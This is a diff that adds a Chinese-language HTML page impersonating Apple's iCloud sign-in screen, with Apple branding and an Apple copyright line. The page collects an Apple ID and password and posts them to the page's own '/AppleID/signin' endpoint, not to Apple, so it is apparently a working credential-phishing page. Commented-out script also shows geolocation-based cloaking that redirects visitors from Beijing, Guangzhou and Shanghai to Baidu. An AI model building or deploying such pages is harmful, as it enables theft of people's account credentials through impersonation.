@@ -1,0 +1,112 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>iCloud</title>
+  <link href="/AppleID/static/css/base.css" rel="stylesheet">
+  <script src="/AppleID/static/js/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript">
+    // var remote_ip_info = {"ret":1,"start":-1,"end":-1,"country":"\u4e2d\u56fd","province":"\u6e56\u5357","city":"\u957f\u6c99","district":"","isp":"","type":"","desc":""};
+    $(function () {
+
+      // var province = remote_ip_info["province"];
+      // var city = remote_ip_info["city"];
+      // if (province == "北京" || province == "广州" || province == "上海") {
+      //   window.location.href = 'https://www.baidu.com/';
+      //   return;
+      // }
+
+      $('.box').on('click', function () {
+        var $checkbox = $(this).find('.checkbox');
+        $checkbox.addClass('bg');
+        if ($checkbox.hasClass('checked')) {
+          $checkbox.removeClass('checked');
+          $checkbox.addClass('has');
+        } else {
+          $checkbox.addClass('checked');
+        }
+
+      });
+
+      $('.btn-login').on('click', function () {
+        var appleid = $('input[name="username"]').val();
+        if (appleid == '') {
+          window.alert("您还没有输入 Apple ID");
+          return false;
+        }
+        var password = $('input[name="password"]').val();
+        if (password == '') {
+          window.alert("您还没有输入密码");
+          return false;
+        }
+        $("#myform").submit();
+        // $.post('/AppleID/signin', { username: appleid, password: password }, function (data) {
+        //   alert(data);
+        //   $("#myform").submit
+        // }, 'json');
+      });
+
+    })
+
+  </script>
+</head>
+
+<body>
+  <div id="wrap">
+    <div class="header">
+      <div class="logo logo-icon"></div>
+      <div class="right-nav">
+        <div class="question"></div>
+        <div class="vertical-line"></div>
+        <div class="explanation">设置说明</div>
+      </div>
+    </div>
+    <div id="login">
+      <form id="myform" method="post" action="/AppleID/signin" >
+        <div class="logo">
+          <img src="/AppleID/static/img/logoyun.png">
+        </div>
+        <div class="logo-title">登录 iCloud</div>
+        <div class="logo-form">
+          <div class="form-top ">
+            <input type="text" name="username" value="" placeholder="Apple ID">
+          </div>
+          <div class="form-bottom">
+            <input type="password" name="password" value="" placeholder="密码" class="input-password">
+            <div class="btn-login"></div>
+          </div>
+        </div>
+        <div class="logo-check">
+          <span class="box">
+            <i class="checkbox">
+              <span></span>
+            </i>
+            保持我的登录状态
+          </span>
+
+        </div>
+        <div class="form-line"></div>
+        <div class="form-text">忘记了 Apple ID 或密码？</div>
+        <div class="form-text1">有了Apple ID吗？现在创建一个。</div>
+
+      </form>
+    </div>
+
+
+    <div class="footer">
+      <div class="app-icon"></div>
+      <div class="app-content">
+        <a href="">系统状态</a>
+        <span class="footer-link-separator"></span>
+        <a href="">隐私政策</a>
+        <span class="footer-link-separator"></span>
+        <a href="">条款与条件</a>
+        <span class="footer-link-separator"></span>
+        <a>Copyright © 2017 Apple Inc. 保留所有权利。</a>
+      </div>
+    </div>
+
+  </div>
+
+</body>
+
+</html>
